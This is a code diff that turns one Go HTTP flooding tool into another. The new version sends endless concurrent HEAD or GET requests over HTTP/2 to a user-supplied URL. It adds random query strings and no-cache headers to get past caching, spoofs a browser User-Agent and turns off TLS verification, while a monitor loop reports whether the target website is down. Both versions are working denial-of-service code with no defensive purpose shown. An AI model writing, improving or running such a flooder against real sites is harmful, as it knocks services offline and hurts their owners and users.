@@ -1,112 +1,78 @@
 package main
 
 import (
-    "bufio"
-    "context"
-    "fmt"
-    "os"
-    "os/signal"
-    "runtime"
-    "strconv"
-    "sync"
-    "sync/atomic"
-    "syscall"
-    "time"
+	"bufio"
+	"crypto/tls"
+	"fmt"
+	"math/rand"
+	"net/http"
+	"os"
+	"strconv"
+	"strings"
+	"sync"
+	"time"
 
-    "github.com/valyala/fasthttp"
+	"golang.org/x/net/http2"
 )
 
 func main() {
-    reader := bufio.NewReader(os.Stdin)
+	reader := bufio.NewReader(os.Stdin)
+	fmt.Print("Enter HTTP method (HEAD or GET): ")
+	method, _ := reader.ReadString('\n')
+	method = strings.ToUpper(strings.TrimSpace(method))
 
-    // Ask for the target URL
-    fmt.Print("Enter the target URL: ")
-    targetURL, _ := reader.ReadString('\n')
-    targetURL = targetURL[:len(targetURL)-1] // Remove the newline character
+	fmt.Print("Enter URL: ")
+	url, _ := reader.ReadString('\n')
+	url = strings.TrimSpace(url)
 
-    // Ask for the number of concurrent threads
-    fmt.Print("Enter the number of concurrent threads: ")
-    concurrencyStr, _ := reader.ReadString('\n')
-    concurrencyStr = concurrencyStr[:len(concurrencyStr)-1] // Remove the newline character
-    concurrency, err := strconv.Atoi(concurrencyStr)
-    if err != nil {
-        fmt.Println("Invalid number of concurrent threads. Please enter a valid integer.")
-        return
-    }
+	fmt.Print("Enter number of threads: ")
+	threadBytes, _, _ := reader.ReadLine()
+	numThreads, _ := strconv.Atoi(strings.TrimSpace(string(threadBytes)))
 
-    // Set GOMAXPROCS to use all available CPUs
-    runtime.GOMAXPROCS(runtime.NumCPU())
+	var wg sync.WaitGroup
+	wg.Add(numThreads)
 
-    // Custom HTTP client with keep-alive and connection pooling
-    client := &fasthttp.Client{
-        MaxConnsPerHost:      concurrency * 2, // Allow more connections per host
-        ReadTimeout:         2 * time.Second,  // Reduce timeouts
-        WriteTimeout:        2 * time.Second,
-        MaxIdleConnDuration: 10 * time.Second, // Keep connections alive longer
-    }
+	tr := &http2.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	client := &http.Client{Transport: tr}
 
-    var wg sync.WaitGroup
-    var requestCount int64
+	for i := 0; i < numThreads; i++ {
+		go func() {
+			defer wg.Done()
 
-    ctx, cancel := context.WithCancel(context.Background())
-    defer cancel()
+			for {
+				// Generate a unique query string to bypass caching
+				randomValue := rand.Intn(1000000)
+				bypassURL := fmt.Sprintf("%s?nocache=%d", url, randomValue)
 
-    reqPool := sync.Pool{
-        New: func() interface{} {
-            return fasthttp.AcquireRequest()
-        },
-    }
+				req, _ := http.NewRequest(method, bypassURL, nil)
+				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
+				req.Header.Set("Pragma", "no-cache")
+				req.Header.Set("Expires", "0")
+				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537")
 
-    respPool := sync.Pool{
-        New: func() interface{} {
-            return fasthttp.AcquireResponse()
-        },
-    }
+				client.Do(req)
+			}
+		}()
+	}
 
-    for i := 0; i < concurrency; i++ {
-        wg.Add(1)
-        go func() {
-            defer wg.Done()
-            for {
-                select {
-                case <-ctx.Done():
-                    return
-                default:
-                    req := reqPool.Get().(*fasthttp.Request)
-                    resp := respPool.Get().(*fasthttp.Response)
-                    req.SetRequestURI(targetURL)
+	go func() {
+		reqStatus, _ := http.NewRequest(method, url, nil)
+		reqStatus.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537")
 
-                    if err := client.Do(req, resp); err != nil {
-                        fmt.Println("Error:", err)
-                    } else {
-                        atomic.AddInt64(&requestCount, 1)
-                    }
+		for {
+			time.Sleep(10 * time.Second)
+			start := time.Now()
+			_, err := client.Do(reqStatus)
+			duration := time.Since(start)
+			if err != nil {
+				fmt.Println("Website is down")
+			} else {
+				fmt.Printf("Website is up ( %.2f ms)\n", float64(duration.Milliseconds()))
+			}
+		}
+	}()
 
-                    req.Reset()
-                    resp.Reset()
-                    reqPool.Put(req)
-                    respPool.Put(resp)
-                }
-            }
-        }()
-    }
-
-    go func() {
-        ticker := time.NewTicker(500 * time.Millisecond)
-        defer ticker.Stop()
-        prevCount := int64(0)
-        for range ticker.C {
-            currentCount := atomic.LoadInt64(&requestCount)
-            rps := (currentCount - prevCount) * 2 // as ticker interval is 0.5s
-            prevCount = currentCount
-            fmt.Printf("\rRPS: %d", rps)
-        }
-    }()
-
-    // Graceful shutdown on Ctrl+C
-    sigChan := make(chan os.Signal, 1)
-    signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
-    <-sigChan
-    cancel()
-    wg.Wait()
+	wg.Wait()
 }
